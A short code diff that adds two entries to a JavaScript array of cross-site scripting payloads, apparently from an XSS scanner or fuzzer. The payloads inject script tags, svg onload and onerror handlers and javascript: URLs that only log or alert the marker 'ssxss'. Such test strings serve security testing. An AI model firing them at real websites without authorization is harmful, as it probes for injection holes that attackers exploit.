@@ -4,6 +4,8 @@ const payloads = [
   `"/><script>console.log('ssxss');</script>`,
   `=""/><script>console.log('ssxss');</script>`,
   `"><svg onload=console.log('ssxss');>`,
+  `' onerror='console.log("ssxss")`,
+  'javascript%3Aalert%28%27ssxss%27%29',
   ';javascript:console.log("ssxss");//',
   '<<SCRIPT>console.log("ssxss");//<</SCRIPT>',
   `$('#div').html('<img alt="<x" title="/><img src=x onerror=console.log("ssxss")>">');`,
